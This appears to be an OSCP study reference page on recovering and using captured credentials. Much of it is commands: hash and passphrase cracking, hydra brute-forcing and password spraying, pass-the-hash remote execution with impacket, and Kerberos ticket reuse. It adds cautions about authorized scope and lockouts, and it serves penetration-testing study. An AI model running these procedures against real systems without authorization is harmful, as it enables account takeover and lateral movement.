# Recover and use authentication material

[Overview](../START.canvas) · [Browser map](../Map.html)

Treat passwords, keys, stored verifiers, challenge responses and tickets as different capabilities. Recovering a password, authenticating and obtaining useful authorization are separate transitions.

## credential-classify

### Classify the artifact and its identity context

**Enter:** A secret-like value, key file, stored hash, challenge response or ticket

**Discovery**

```text
file FILE
head -c 160 FILE
```

**Interpret:** Headers and producing context distinguish a private key, challenge response and stored NT verifier.

**Still check:** Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations.

**Verify:** Identify artifact type, source, account/domain and compatible next operation; record unknowns instead of guessing.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#credential-classify)

### Full procedure and variants

```text
SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY
-> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION
-> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION
```

Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together.

| Material | Recognition | Compatible use |
| --- | --- | --- |
| Cleartext password | Text tied to an identity/source | Normal protocol/application login |
| SSH private key | OpenSSH/PEM private-key block | SSH public-key authentication; recover passphrase offline if protected |
| Linux password record | `USER:$id$salt$digest:...` | Offline recovery with complete record/format |
| Application/file verifier | Tool-specific `$...$` or documented digest | Offline recovery with matching mode/parser |
| NT hash | Usually 32 hex from SAM/LSASS/NTDS context | Offline recovery; PtH where NTLM and the client support it |
| Net-NTLMv2 response | `USER::DOMAIN:challenge:proof:blob` | Offline recovery or live relay under specific conditions; not PtH material |
| DCC2/MSCache v2 | Username-dependent cached-domain verifier | Offline recovery; not ordinary PtH material |
| Kerberos ticket | `.kirbi`, ccache or in-memory cache | Ticket-specific access subject to realm, SPN, validity, clock and route |
| Kerberos roast material | `$krb5asrep$...` or `$krb5tgs$...` | Offline recovery with matching enctype/mode |
| Session/API token | Cookie, bearer/JWT or application token | Issuing application and authorization context only |

Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format:

```bash
hashid HASH_OR_FILE
john --list=formats | grep -i KEYWORD
hashcat -hh | grep -i KEYWORD
hashcat --example-hashes | less
```

> **Failure cue:** `No hashes loaded`, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.

| Output | Type | Immediate compatible possibilities | Not valid as |
| --- | --- | --- | --- |
| Cleartext password | Reusable secret | Password authentication, key derivation, DPAPI where applicable | Proof of authorization |
| NT hash | NTLM key | Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported | Net-NTLM response or DCC2 |
| AES128/AES256 key | Kerberos long-term key | Request Kerberos material using compatible tooling | Direct NTLM authentication |
| `.kirbi` / ccache | Kerberos ticket container | Use while valid for its client/realm/SPN scope | Password/hash |
| DCC2/MSCache v2 | Offline verifier | Offline cracking | PTH |
| DPAPI key/blob | Protected-data material | Decrypt only with matching context/keys | General logon credential |
| Machine-account key | Computer identity | Map the computer account's rights and Kerberos/NTLM paths | Human/domain-admin identity |

Every newly usable identity returns to Block 10 before movement:

```text
VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES
```

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
- [ Classify tickets and use a compatible cache](credentials.md#ticket-use) — A ccache/kirbi file or an existing ticket cache Required: Correct principal/realm, valid lifetime, service scope, compatible cache format and naming/KDC route
- [ Recover a protected KeePass database password](credentials.md#keepass-recovery) — A readable KeePass database and possible associated key file Required: Complete database, compatible converter, and every required factor; a feasible password candidate strategy
- [ Inspect and recover SSH private-key access](credentials.md#ssh-key) — A private key from a file read, share, repository or home directory Required: Correct key format, passphrase if encrypted, matching server account/key authorization and accepted algorithm/policy
- [ Recover Linux account passwords from matched records](credentials.md#linux-hashes) — Readable password verifiers and account metadata Required: Correct passwd/shadow pairing or known hash format; account identity and a feasible recovery strategy
- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Recover a password from a captured NTLM response](credentials.md#netntlm-recovery) — A complete challenge-response record Required: Correct challenge/response formatting and feasible candidates; acquisition method must fit the allowed context
- [ Recover a password from cached domain logon verifiers](credentials.md#dcc2-recovery) — A DCC2/MSCache record from matched SECURITY/SYSTEM material Required: Correct username/salt/iteration context and feasible offline candidates
## credential-use

### Validate known passwords and context-specific reuse

**Enter:** A password tied to a plausible user and service

**Discovery**

```text
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
```

**Interpret:** Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM.

**Still check:** Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization.

**Verify:** Record exact identity, service and tested read/write/session effect; classify authentication and authorization separately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#credential-use)

### Full procedure and variants

Use the normal client for the observed service:

```bash
ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
```

Local Windows account:

```bash
nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares
```

> **Decisive output:** the destination service accepts the intended identity. Share, session or action access is a separate authorization result.

<details>
<summary><strong>Variant — known user, targeted password dictionary</strong></summary>

```bash
hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET
```

Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.

</details>

<details>
<summary><strong>Variant — one password across an authorized user list</strong></summary>

```bash
hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success
```

One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.

</details>

<details>
<summary><strong>Variant — HTTP POST form</strong></summary>

Capture a correct request and stable failure marker with Burp:

```bash
hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'
```

Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.

</details>

<details>
<summary><strong>RunasCs — test a known password from an existing Windows shell</strong></summary>

Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.

```cmd
REM Domain account: verify the new process token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN

REM Local account: omit the domain switch for the current host's account
RunasCs.exe USER PASSWORD "cmd /c whoami /all"

REM Network-only credentials: local identity stays unchanged
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9
```

> **Read:** in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.

[RunasCs upstream](https://github.com/antonioCoco/RunasCs). Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.

</details>

```text
accepted identity -> groups/roles -> reachable services -> shares/files
-> authenticated application behavior -> accessible hosts/routes
-> new credentials/tickets/sessions -> privilege and movement handoffs
```

Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.

```cmd
net accounts /domain
```

```powershell
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
```

Password validation belongs to the existing [credential procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md). Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately.

### Follow the evidence

- [ Enumerate SMB/RPC shares, files and identities](services.md#service-smb) — SMB/RPC endpoints, domain clues or new credentials Required: Reachable SMB/RPC; anonymous, guest, local or domain context must be explicit; share and filesystem ACLs both matter
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh) — An SSH service and a known password, private key or agent context Required: Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission
## offline-recovery

### Recover passwords with feasible dictionary, rule and mask attacks

**Enter:** A supported stored verifier or converted protected artifact

**Discovery**

```text
hashcat --example-hashes
john --list=formats
```

**Interpret:** A verified format and feasible candidate model enable offline recovery; a hash-shaped string alone does not.

**Still check:** Check complete salt/context, conversion correctness, tool backend and whether all required factors are present.

**Verify:** Use the tool's show/result output and then validate the recovered credential in its correct context.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#offline-recovery)

### Full procedure and variants

```bash
hashcat -b -m MODE
python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"
```

Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:

```text
exact recovered/default candidates -> organization/user/product words
-> observed policy and mutations -> small dictionary plus rules
-> known mask/hybrid -> broader curated lists/rules
-> exhaustive search only when its measured cost is defensible
```

Preview mutations before spending the candidate budget:

```bash
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50
```

```bash
hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show
```

> `-a 0` is dictionary mode. Do not use `-a 3` with a wordlist; attack mode 3 expects a mask.

Common source examples identify NTLM as mode `1000`, Net-NTLMv2 as `5600` and KeePass as `13400`, but confirm against the installed version:

```bash
hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'
```

<details>
<summary><strong>Mask and session variants</strong></summary>

```bash
hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
hashcat --session targeted-mask --restore
```

> Mask order is a hypothesis about structure. Estimate its keyspace before committing time.

</details>

<details>
<summary><strong>Hybrid variant — base word plus three digits</strong></summary>

```bash
hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid
```

Use only when evidence supports both the base words and suffix shape.

</details>

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```bash
john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --session=crack-job --wordlist=wordlist.txt hash.txt
john --restore=crack-job
```

File-to-hash converters:

```bash
zip2john archive.zip > archive.hash
7z2john archive.7z > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
unshadow passwd.copy shadow.copy > linux.hash
```

Converter availability varies by package/path; locate it rather than assuming:

```bash
command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null
```

> Preserve the complete converter output. Some formats include a filename label before `:` that John accepts but Hashcat may require removed from a separate tool-specific copy.

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Inspect and recover SSH private-key access](credentials.md#ssh-key) — A private key from a file read, share, repository or home directory Required: Correct key format, passphrase if encrypted, matching server account/key authorization and accepted algorithm/policy
- [ Request a selected service ticket for offline service-account recovery](ad-identities.md#kerberos-roast) — A user-owned SPN and a useful service-account relationship Required: A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy
## keepass-recovery

### Recover a protected KeePass database password

**Enter:** A readable KeePass database and possible associated key file

**Discovery**

```text
file FILE
keepass2john FILE > keepass.hash
```

**Interpret:** A supported database gives a recovery target, but a referenced key file indicates a separate factor.

**Still check:** Confirm vault version, required key/account factors and a feasible password search.

**Verify:** Open the database with all factors and distinguish vault credentials from target account credentials.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#keepass-recovery)

### Full procedure and variants

```bash
keepass2john vault.kdbx > keepass.hash
john --wordlist=wordlist.txt keepass.hash
john --show keepass.hash
```

Hashcat alternative after confirming KDBX/KDF and input format:

```bash
hashcat -hh | grep -i keepass
hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13400 keepass.hash --show
```

> Mode `13400` covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault.

### Follow the evidence

- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Inspect source, backups, configuration and repository artifacts](web-mapping.md#web-artifacts) — JavaScript endpoints, backup names, exposed configuration or Git metadata Required: Readable application artifact or a complete recoverable repository; preserve the public-source scope
## ssh-key

### Inspect and recover SSH private-key access

**Enter:** A private key from a file read, share, repository or home directory

**Discovery**

```text
file KEY
ssh-keygen -y -f KEY
```

**Interpret:** The artifact is a private key protected by a local passphrase; this is separate from the SSH account password.

**Still check:** Determine the protecting passphrase, associated remote user, accepted algorithm and server key authorization.

**Verify:** Verify the key parses and an SSH authentication/session succeeds under the correct target identity.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#ssh-key)

### Full procedure and variants

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt ssh.hash
john --show ssh.hash
chmod 600 id_rsa
ssh-keygen -y -f id_rsa > derived.pub
ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET
```

> Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. `Permission denied (publickey)` can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.

<details>
<summary><strong>Hashcat variant — only for a supported OpenSSH format</strong></summary>

```bash
hashcat -hh | grep -i 'OpenSSH\|Private Key'
hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE
```

Choose `MODE` from the complete `$sshng$...` structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not `--force` with a wrong mode.

</details>

### Follow the evidence

- [ Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh) — An SSH service and a known password, private key or agent context Required: Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission
- [ Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local) — SSH reaches a server that can access the needed internal service Required: Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
## linux-hashes

### Recover Linux account passwords from matched records

**Enter:** Readable password verifiers and account metadata

**Discovery**

```text
file passwd.txt shadow.txt
head -n 3 passwd.txt
head -n 3 shadow.txt
```

**Interpret:** The matching account name and verifier prefix identify an offline password-recovery candidate.

**Still check:** Confirm snapshots, hash format and account state; a locked field or absent salt is not a normal usable verifier.

**Verify:** Tie the recovered password to the correct user and validate an allowed login/sudo transition.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#linux-hashes)

### Full procedure and variants

```bash
unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=Jumbo linux.hash
john --show linux.hash
```

> Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, `su` policy or a disabled account.

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo) — sudo -l grants an operation under a more useful identity Required: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
## nt-hash

### Recover or reuse an NT password hash

**Enter:** An NT verifier from an appropriate credential source

**Discovery**

```text
head -n 3 hashes.txt
```

**Interpret:** The source and record fields identify an NT verifier for that local account, not a captured challenge response.

**Still check:** Verify the actual NT field, account scope and an accepting service/client with the required destination right.

**Verify:** Verify source/type, identity context and the exact permitted service action.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#nt-hash)

### Full procedure and variants

Offline recovery:

```bash
hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT --wordlist=wordlist.txt nt.hash
```

Compatible SMB validation:

```bash
nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH
```

> NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.

<details>
<summary><strong>Variant — remote access/execution when the identity has matching rights</strong></summary>

```bash
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore
```

WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.

</details>

### Follow the evidence

- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Execute through uploaded service creation using PsExec](lateral-movement.md#move-services) — A destination grants administrative-share write and service-control rights Required: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context
## netntlm-recovery

### Recover a password from a captured NTLM response

**Enter:** A complete challenge-response record

**Discovery**

```text
head -n 2 responses.txt
```

**Interpret:** A challenge-bound response supports its appropriate offline verification workflow; it is not the long-term NT hash.

**Still check:** Check complete capture format, account mapping and feasible candidates; acquisition/relay policy is a separate issue.

**Verify:** Retain response provenance and recovered account/password mapping; confirm relevant login rights separately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#netntlm-recovery)

### Full procedure and variants

```bash
hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
```

> A Net-NTLMv2 response is not an NT hash and cannot be supplied to `-H` or `-hashes`. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.

The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide.

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
- [ Establish domain identity, DC, DNS, time and route](ad-mapping.md#domain-state) — Domain credentials or a domain-joined foothold Required: Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew
## dcc2-recovery

### Recover a password from cached domain logon verifiers

**Enter:** A DCC2/MSCache record from matched SECURITY/SYSTEM material

**Discovery**

```text
head -n 3 dcc2.txt
```

**Interpret:** The DCC2 structure and username-associated derivation identify offline cached-logon material.

**Still check:** Verify iteration/username context, source consistency and current online account state after any recovery.

**Verify:** Confirm artifact format, account mapping and current password acceptance.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#dcc2-recovery)

### Full procedure and variants

```bash
hashcat -hh | grep -i 'Domain Cached'
john --format=mscash2 --wordlist=wordlist.txt dcc2.hash
```

> Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material.

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Establish domain identity, DC, DNS, time and route](ad-mapping.md#domain-state) — Domain credentials or a domain-joined foothold Required: Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew
- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
## ticket-use

### Classify tickets and use a compatible cache

**Enter:** A ccache/kirbi file or an existing ticket cache

**Discovery**

```text
klist -c FILE
```

**Interpret:** This is service-scoped CIFS material, not a TGT for requesting arbitrary services.

**Still check:** Check lifetime, cache format, exact SPN/name, route and destination object authorization.

**Verify:** Inspect principal, ticket service, realm and lifetime, then verify the actual service action.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/credentials/#ticket-use)

### Full procedure and variants

Inspect before use:

```bash
klist
KRB5CCNAME=TICKET.ccache klist
impacket-ticketConverter TICKET.kirbi TICKET.ccache
```

Compatible client example:

```bash
export KRB5CCNAME=TICKET.ccache
impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN'
```

> Verify client principal, realm, TGT versus service ticket, SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures.

### Follow the evidence

- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
